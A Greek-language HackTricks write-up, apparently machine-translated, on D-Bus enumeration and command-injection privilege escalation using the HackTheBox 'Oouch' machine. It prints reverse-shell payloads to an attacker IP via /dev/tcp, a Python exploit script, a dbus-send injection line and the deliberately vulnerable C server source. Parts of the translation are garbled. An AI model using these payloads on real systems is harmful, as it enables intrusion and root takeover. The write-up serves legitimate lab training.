# Διακριτοποίηση D-Bus και Επιβολή Προνομιακών Δικαιωμάτων με Εντολή Εισαγωγής

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## **Διακριτοποίηση GUI**

Το D-Bus χρησιμοποιείται ως μεσολαβητής επικοινωνίας μεταξύ διεργασιών (IPC) στα περιβάλλοντα επιφάνειας εργασίας του Ubuntu. Στο Ubuntu, παρατηρείται η συνδυαστική λειτουργία αρκετών διαύλων μηνυμάτων: ο διαύλος του συστήματος, που χρησιμοποιείται κυρίως από **προνομιούχες υπηρεσίες για την παροχή υπηρεσιών που αφορούν σε ολόκληρο το σύστημα**, και ένας διαύλος συνεδρίας για κάθε συνδεδεμένο χρήστη, που παρέχει υπηρεσίες που αφορούν μόνο σε αυτόν τον συγκεκριμένο χρήστη. Ο κύριος στόχος εδώ είναι ο διαύλος του συστήματος λόγω της συσχέτισής του με υπηρεσίες που λειτουργούν με υψηλά προνόμια (π.χ., root), καθώς ο στόχος μας είναι η ανύψωση των προνομίων. Σημειώνεται ότι η αρχιτεκτονική του D-Bus χρησιμοποιεί έναν "δρομολογητή" ανά διαύλο συνεδρίας, ο οποίος είναι υπεύθυνος για την ανακατεύθυνση των μηνυμάτων των πελατών στις κατάλληλες υπηρεσίες με βάση τη διεύθυνση που καθορίζεται από τους πελάτες για την υπηρεσία με την οποία επιθυμούν να επικοινωνήσουν.

Οι υπηρεσίες στο D-Bus καθορίζονται από τα **αντικείμενα** και τις **διεπαφές** που παρέχουν. Τα αντικείμενα μπορούν να μοιάζουν με περιπτώσεις κλάσεων σε κανονικές γλώσσες αντικειμένων προσανατολισμένων στο αντικείμενο (OOP), με κάθε περίπτωση να αναγνωρίζεται μοναδικά από ένα **μονοπάτι αντικειμένου**. Αυτό το μονοπάτι, παρόμοιο με ένα μονοπάτι αρχείου, αναγνωρίζει μοναδικά κάθε αντικείμενο που παρέχεται από την υπηρεσία. Μια κύρια διεπαφή για ερευνητικούς σκοπούς είναι η διεπαφή **org.freedesktop.DBus.Introspectable**, που περιλαμβάνει μια μοναδική μέθοδο, την Introspect. Αυτή η μέθοδος επιστρέφει μια XML αναπαράσταση των υποστηριζόμενων μεθόδων, σημάτων και ιδιοτήτων του αντικειμένου, με έμφαση εδώ στις μεθόδους και παράλειψη των ιδιοτήτων και των σημάτων.

Για την επικοινωνία με τη διεπαφή D-Bus, χρησιμοποιήθηκαν δύο εργαλεία: ένα εργαλείο γραμμής εντολών με το όνομα **gdbus** για εύκολη κλήση των μεθόδων που παρέχονται από το D-Bus σε σενάρια, και το [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), ένα εργαλείο βασισμένο σε Python σχεδιασμένο για την απαρίθμηση των διαθέσιμων υπηρεσιών σε κάθε διαύλο και την εμφάνιση των αντικειμένων που περιέχονται σε κάθε υπηρεσία.
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)


Στην πρώτη εικόνα φαίνονται οι υπηρεσίες που έχουν καταχωρηθεί με το σύστημα διαύλου D-Bus, με τον **org.debin.apt** να είναι ειδικά επισημασμένος μετά την επιλογή του κουμπιού System Bus. Το D-Feet ερωτά αυτήν την υπηρεσία για αντικείμενα, εμφανίζοντας διεπαφές, μεθόδους, ιδιότητες και σήματα για τα επιλεγμένα αντικείμενα, όπως φαίνεται στη δεύτερη εικόνα. Λεπτομερείς πληροφορίες δίνονται και για την υπογραφή κάθε μεθόδου.

Ένα σημαντικό χαρακτηριστικό είναι η εμφάνιση του **αναγνωριστικού διεργασίας (pid)** και της **γραμμής εντολής** της υπηρεσίας, που είναι χρήσιμα για την επιβεβαίωση εάν η υπηρεσία λειτουργεί με αυξημένα δικαιώματα, κάτι που είναι σημαντικό για την σχετική έρευνα.

**Το D-Feet επίσης επιτρέπει την κλήση μεθόδων**: οι χρήστες μπορούν να εισάγουν εκφράσεις Python ως παραμέτρους, οι οποίες το D-Feet μετατρέπει σε τύπους D-Bus πριν την πέραση στην υπηρεσία.

Ωστόσο, πρέπει να σημειωθεί ότι **ορισμένες μεθόδοι απαιτούν πιστοποίηση** πριν από την επιτροπή τους. Θα αγνοήσουμε αυτές τις μεθόδους, αφού ο στόχος μας είναι να αναβαθμίσουμε τα δικαιώματά μας χωρίς διαπιστευτήρια από την αρχή.

Επίσης, πρέπει να σημειωθεί ότι ορισμένες από τις υπηρεσίες ερωτούν μια άλλη υπηρεσία D-Bus με το όνομα org.freedeskto.PolicyKit1 εάν ένας χρήστης πρέπει να επιτραπεί να εκτελέσει ορισμένες ενέργειες ή όχι.

## **Απαρίθμηση γραμμής εντολής**

### Λίστα αντικειμένων υπηρεσίας

Είναι δυνατόν να απαριθμήσουμε τις ανοιχτές διεπαφές D-Bus με:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### Συνδέσεις

[Από την Wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Όταν ένας διεργασία δημιουργεί μια σύνδεση με ένα λεωφορείο, το λεωφορείο αναθέτει στη σύνδεση ένα ειδικό όνομα λεωφορείου που ονομάζεται _μοναδικό όνομα σύνδεσης_. Τα ονόματα λεωφορείου αυτού του τύπου είναι αμετάβλητα - είναι εγγυημένο ότι δεν θα αλλάξουν όσο υπάρχει η σύνδεση - και, ακόμα πιο σημαντικό, δεν μπορούν να χρησιμοποιηθούν ξανά κατά τη διάρκεια της διάρκειας ζωής του λεωφορείου. Αυτό σημαίνει ότι καμία άλλη σύνδεση με αυτό το λεωφορείο δεν θα έχει ποτέ ανατεθεί τέτοιο μοναδικό όνομα σύνδεσης, ακόμα κι αν η ίδια διεργασία κλείσει τη σύνδεση με το λεωφορείο και δημιουργήσει μια νέα. Τα μοναδικά ονόματα σύνδεσης είναι εύκολα αναγνωρίσιμα επειδή ξεκινούν με τον - αλλιώς απαγορευμένο - χαρακτήρα των ανάγκαστικών.

### Πληροφορίες αντικειμένου υπηρεσίας

Στη συνέχεια, μπορείτε να λάβετε ορισμένες πληροφορίες σχετικά με τη διεπαφή με:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### Λίστα Διεπαφών Αντικειμένου Υπηρεσίας

Θα πρέπει να έχετε αρκετές άδειες.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Επιθεώρηση Διεπαφής ενός Αντικειμένου Υπηρεσίας

Παρατηρήστε πώς σε αυτό το παράδειγμα επιλέχθηκε η πιο πρόσφατη διεπαφή που ανακαλύφθηκε χρησιμοποιώντας την παράμετρο `tree` (_δείτε την προηγούμενη ενότητα_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Σημειώστε τη μέθοδο `.Block` της διεπαφής `htb.oouch.Block` (αυτή που μας ενδιαφέρει). Το "s" στις άλλες στήλες μπορεί να σημαίνει ότι αναμένει ένα string.

### Διεπαφή Παρακολούθησης/Καταγραφής

Με επαρκή δικαιώματα (μόνο τα δικαιώματα `send_destination` και `receive_sender` δεν είναι αρκετά) μπορείτε να **παρακολουθήσετε μια επικοινωνία D-Bus**.

Για να **παρακολουθήσετε** μια **επικοινωνία** θα πρέπει να είστε **root**. Εάν αντιμετωπίζετε προβλήματα για να γίνετε root, ελέγξτε [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) και [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

{% hint style="warning" %}
Εάν γνωρίζετε πώς να ρυθμίσετε ένα αρχείο ρύθμισης D-Bus για να επιτρέψετε σε μη root χρήστες να καταγράφουν την επικοινωνία, παρακαλώ **επικοινωνήστε μαζί μου**!
{% endhint %}

Διάφοροι τρόποι παρακολούθησης:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
Στο παρακάτω παράδειγμα, παρακολουθείται η διεπαφή `htb.oouch.Block` και **αποστέλλεται το μήνυμα "**_**lalalalal**_**" μέσω εσφαλμένης επικοινωνίας**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Μπορείτε να χρησιμοποιήσετε τη λέξη `capture` αντί για `monitor` για να αποθηκεύσετε τα αποτελέσματα σε ένα αρχείο pcap.

#### Φιλτράροντας τον περιττό θόρυβο <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Εάν υπάρχει πάρα πολλή πληροφορία στο δίκτυο, μπορείτε να περάσετε έναν κανόνα αντιστοίχισης όπως εξής:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Μπορούν να καθοριστούν πολλαπλοί κανόνες. Εάν ένα μήνυμα ταιριάζει με _οποιονδήποτε_ από τους κανόνες, το μήνυμα θα εκτυπωθεί. Όπως εξής:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Δείτε την [τεκμηρίωση του D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) για περισσότερες πληροφορίες σχετικά με τη σύνταξη των κανόνων αντιστοίχισης.

### Περισσότερα

Το `busctl` έχει ακόμα περισσότερες επιλογές, [**βρείτε τις όλες εδώ**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Ευάλωτο Σενάριο**

Ως χρήστης **qtc μέσα στον οικοδεσπότη "oouch" από το HTB**, μπορείτε να βρείτε ένα **απρόσμενο αρχείο ρύθμισης D-Bus** που βρίσκεται στο _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Σημείωση από την προηγούμενη διαμόρφωση ότι **θα πρέπει να είστε ο χρήστης `root` ή `www-data` για να στείλετε και να λάβετε πληροφορίες** μέσω αυτής της επικοινωνίας D-BUS.

Ως χρήστης **qtc** μέσα στο docker container **aeb4525789d8** μπορείτε να βρείτε κάποιον κώδικα που σχετίζεται με το dbus στο αρχείο _/code/oouch/routes.py._ Αυτός είναι ο ενδιαφέρων κώδικας:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Όπως μπορείτε να δείτε, γίνεται **σύνδεση σε ένα διεπαφή D-Bus** και αποστέλλεται στη **συνάρτηση "Block"** το "client\_ip".

Στην άλλη πλευρά της σύνδεσης D-Bus υπάρχει ένας μεταγλωττισμένος δυαδικός κώδικας που εκτελείται. Αυτός ο κώδικας **ακούει** στη σύνδεση D-Bus **για διευθύνσεις IP και καλεί το iptables μέσω της συνάρτησης `system`** για να αποκλείσει την δοθείσα διεύθυνση IP.\
**Η κλήση στη `system` είναι ευάλωτη επίτηδες σε εντολές εισαγωγής**, έτσι ένα payload όπως το παρακάτω θα δημιουργήσει ένα αντίστροφο shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Εκμεταλλευτείτε το

Στο τέλος αυτής της σελίδας μπορείτε να βρείτε τον **πλήρη κώδικα C της εφαρμογής D-Bus**. Μέσα σε αυτόν μπορείτε να βρείτε μεταξύ των γραμμών 91-97 **πώς εγγράφονται οι `διαδρομή αντικειμένου D-Bus`** **και το `όνομα διεπαφής`**. Αυτές οι πληροφορίες θα είναι απαραίτητες για να στείλετε πληροφορίες στη σύνδεση D-Bus:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Επίσης, στη γραμμή 57 μπορείτε να δείτε ότι **η μόνη μέθοδος που έχει καταχωρηθεί** για αυτήν την επικοινωνία D-Bus ονομάζεται `Block` (_**Γι' αυτό στην επόμενη ενότητα οι φορτία θα αποστέλλονται στο αντικείμενο υπηρεσίας `htb.oouch.Block`, τη διεπαφή `/htb/oouch/Block` και τη μέθοδο με όνομα `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Ο παρακάτω κώδικας σε python θα στείλει το payload στη σύνδεση D-Bus στη μέθοδο `Block` μέσω `block_iface.Block(runme)` (_σημείωση ότι αυτό εξήχθη από το προηγούμενο τμήμα του κώδικα_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl και dbus-send

The `busctl` and `dbus-send` commands are powerful tools for interacting with the D-Bus system. D-Bus is a message bus system that allows different applications to communicate with each other. These commands can be used for enumeration and command injection privilege escalation attacks.

- `busctl` is a command-line tool that allows you to introspect and interact with the D-Bus system. It can be used to list available services, objects, and interfaces, as well as call methods and inspect properties.

- `dbus-send` is another command-line tool that allows you to send messages to the D-Bus system. It can be used to invoke methods on objects, set properties, and send signals.

Both of these tools can be used to discover vulnerable services and interfaces that can be exploited for privilege escalation. By enumerating the available services and objects, an attacker can identify potential targets for further exploitation. Additionally, by injecting malicious commands or scripts into method calls or property settings, an attacker can execute arbitrary code with elevated privileges.

It is important to note that these tools should only be used for legitimate purposes, such as testing the security of your own systems or with proper authorization during a penetration testing engagement. Unauthorized use of these tools can lead to legal consequences.
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
* Το `dbus-send` είναι ένα εργαλείο που χρησιμοποιείται για να στείλει μηνύματα στο "Message Bus".
* Το Message Bus είναι ένα λογισμικό που χρησιμοποιείται από τα συστήματα για να διευκολύνει τις επικοινωνίες μεταξύ εφαρμογών. Σχετίζεται με την ουρά μηνυμάτων (τα μηνύματα ταξινομούνται σε ακολουθία), αλλά στο Message Bus τα μηνύματα στέλνονται με μοντέλο συνδρομής και είναι πολύ γρήγορα.
* Ο ετικέτα "system" χρησιμοποιείται για να υποδείξει ότι είναι ένα μήνυμα συστήματος, όχι ένα μήνυμα συνεδρίας (από προεπιλογή).
* Η ετικέτα "--print-reply" χρησιμοποιείται για να εκτυπώσει το μήνυμά μας κατάλληλα και να λάβει οποιεσδήποτε απαντήσεις σε μια ανθρώπινη αναγνώσιμη μορφή.
* Η ετικέτα "--dest=Dbus-Interface-Block" αναφέρεται στη διεύθυνση της διεπαφής Dbus.
* Η ετικέτα "--string:" είναι ο τύπος του μηνύματος που θέλουμε να στείλουμε στη διεπαφή. Υπάρχουν αρκετές μορφές αποστολής μηνυμάτων, όπως double, bytes, booleans, int, objpath. Από αυτές, το "object path" είναι χρήσιμο όταν θέλουμε να στείλουμε τη διαδρομή ενός αρχείου στη διεπαφή Dbus. Σε αυτήν την περίπτωση, μπορούμε να χρησιμοποιήσουμε ένα ειδικό αρχείο (FIFO) για να περάσουμε ένα εντολή στη διεπαφή με το όνομα ενός αρχείου. "string:;" - Αυτό είναι για να καλέσουμε ξανά τη διαδρομή του αντικειμένου όπου τοποθετούμε το αρχείο/εντολή αντιστροφής της κατάληξης του FIFO.
_Σημειώστε ότι στο `htb.oouch.Block.Block`, ο πρώτος μέρος (`htb.oouch.Block`) αναφέρεται στο αντικείμενο υπηρεσίας και το τελευταίο μέρος (`.Block`) αναφέρεται στο όνομα της μεθόδου._

### Κώδικας C

{% code title="d-bus_server.c" %}
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

## Αναφορές
* [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
